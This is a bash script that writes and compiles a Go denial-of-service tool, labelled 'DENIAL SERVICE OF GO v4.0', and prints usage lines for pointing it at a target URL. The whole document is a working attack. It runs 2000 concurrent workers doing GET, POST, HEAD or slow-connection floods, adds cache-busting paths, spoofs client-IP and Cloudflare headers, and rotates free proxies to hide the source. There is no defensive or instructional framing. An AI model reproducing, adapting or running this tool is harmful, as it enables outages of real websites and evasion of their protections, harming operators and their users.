#!/bin/bash

# ----------------------------------------
# GO DOS TOOL - NO DEPS VERSION
# ----------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  DENIAL SERVICE OF GO - NO DEPS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

rm -f main.go

cat > main.go << 'EOF'
package main

import (
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
	}

	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"",
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
)

type ConnectionPool struct {
	clients  []*http.Client
	counter  uint64
	size     int
	useProxy bool
}

func NewConnectionPool(poolSize int, useProxy bool) *ConnectionPool {
	pool := &ConnectionPool{
		clients:  make([]*http.Client, poolSize),
		size:     poolSize,
		useProxy: useProxy,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
	}

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport.Proxy = http.ProxyURL(proxyURL)
			}
		}
	}

	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyAPI)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return
	}

	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")

	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}

	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func printBanner() {
	fmt.Println("\033[35m")
	fmt.Println("   ╔══════════════════════════════════════════╗")
	fmt.Println("   ║     DENIAL SERVICE OF GO - v4.0          ║")
	fmt.Println("   ║     HTTP/1.1 + HTTP/2 + Proxy Support    ║")
	fmt.Println("   ╚══════════════════════════════════════════╝")
	fmt.Println("\033[0m")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func generateCacheBust() string {
	return "?v=" + strconv.Itoa(randInt(1, 999999))
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info",
		"/wp-admin", "/admin", "/login", "/dashboard",
	}
	return paths[randInt(0, len(paths)-1)]
}

func addSpoofHeaders(req *http.Request) {
	spoofIP := randomIP()
	
	req.Header.Set("X-Forwarded-For", spoofIP)
	req.Header.Set("X-Real-IP", spoofIP)
	req.Header.Set("True-Client-IP", spoofIP)
	req.Header.Set("X-Originating-IP", spoofIP)
	req.Header.Set("X-Remote-IP", spoofIP)
	req.Header.Set("X-Client-IP", spoofIP)
	req.Header.Set("CF-Connecting-IP", spoofIP)
	req.Header.Set("CF-IPCountry", "US")
	req.Header.Set("CDN-Loop", "cloudflare")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("DNT", "1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Cache-Control", "no-cache")
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 2)
	
	useProxy := false
	for i := 1; i < len(os.Args); i++ {
		if os.Args[i] == "proxy" {
			useProxy = true
		}
	}
	
	if useProxy {
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}
	
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("")
		fmt.Println(" Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
		fmt.Println("")
		fmt.Println(" Examples:")
		fmt.Println("   ./main https://target.com 60 GET")
		fmt.Println("   ./main https://target.com 120 POST proxy")
		fmt.Println("   ./main https://target.com 30 HEAD")
		fmt.Println("   ./main https://target.com 60 SLOW")
		fmt.Println("")
		os.Exit(1)
	}
	
	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])
	
	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}
	
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}
	
	durationSec, _ := strconv.Atoi(durStr)
	duration := time.Duration(durationSec) * time.Second
	
	printBanner()
	fmt.Printf(" Target: %s\n", target)
	fmt.Printf(" Mode: %s\n", mode)
	fmt.Printf(" Duration: %d sec\n", durationSec)
	fmt.Printf(" Workers: 2000\n")
	if useProxy && len(proxies) > 0 {
		fmt.Printf(" Proxies: %d\n", len(proxies))
	}
	fmt.Println(" Spoofing: ENABLED (11+ headers)")
	fmt.Println(" Starting... Press Ctrl+C to stop")
	fmt.Println("")
	
	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy)
	
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()
	
	go func() {
		time.Sleep(duration)
		close(done)
	}()
	
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()
	
	workers := 2000
	for i := 0; i < workers; i++ {
		go attackWorker(target, mode, done, stats, connectionPool)
	}
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n\n Attack completed!\n")
			fmt.Printf(" Total requests: %d\n", stats.get())
			fmt.Printf(" Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f    ", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}
			
			fullURL := strings.TrimSuffix(target, "/") + path
			
			var req *http.Request
			var err error
			
			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "443"
				if u.Scheme == "http" {
					port = "80"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", path, host, randomUA())
				stats.inc()
				time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}
			
			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := "data=" + randomString(randInt(8, 16))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}
			
			if err != nil {
				continue
			}
			
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Connection", "keep-alive")
			
			addSpoofHeaders(req)
			
			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created${NC}"
fi

echo
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
echo

# Clean and compile - NO EXTERNAL DEPS NEEDED
rm -f go.mod go.sum 2>/dev/null
go build -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    rm -f main.go
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e " ${GREEN}►${NC} With proxies: ${YELLOW}./main https://target.com 120 POST proxy${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    rm -f main.go
    exit 1
fi
